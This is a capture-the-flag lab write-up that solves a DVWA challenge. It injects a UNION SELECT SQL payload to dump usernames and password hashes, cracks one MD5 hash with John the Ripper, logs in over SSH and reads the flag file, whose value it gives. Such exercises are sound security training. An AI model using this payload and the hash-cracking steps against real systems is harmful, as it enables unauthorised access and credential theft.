## Challenge 1: SQL Injection
# Objective:
Find the password for Gordon Brown's account using SQL injection, then access the file containing the flag.

# Steps:

1. Navigate to http://10.6.6.100 using your browser.
2. Login using the following credintials:

Username: admin

Password: password

3. After logging in, set the DVWA security level to low.
4. Navigate to the SQL Injection page:

5. Find the User ID field and enter the following payload:

  1' OR 1=1 UNION SELECT user, password FROM users #

This will exploit the SQL injection vulnerability to retrieve usernames and their password hashes.

6. Crack Gordon Brown’s password:

Copy the hash for Gordon Brown's password into a text file. 

echo e99a18c428cb38d5f260853678922e03 > passwd.txt

7. Use John the Ripper to crack the password hash:

john --format=raw-md5 passwd.txt

8. Login as Gordon Brown:

ssh gordonb@172.17.0.2
Locate the flag:

9. Once logged in, run the following command to list files in the home directory:

  ls

10. You will see a file called hkxisx.txt. Open it to find the flag:

cat hkxisx.txt
# Result: 

Flag for Challenge 1: 4E9f12
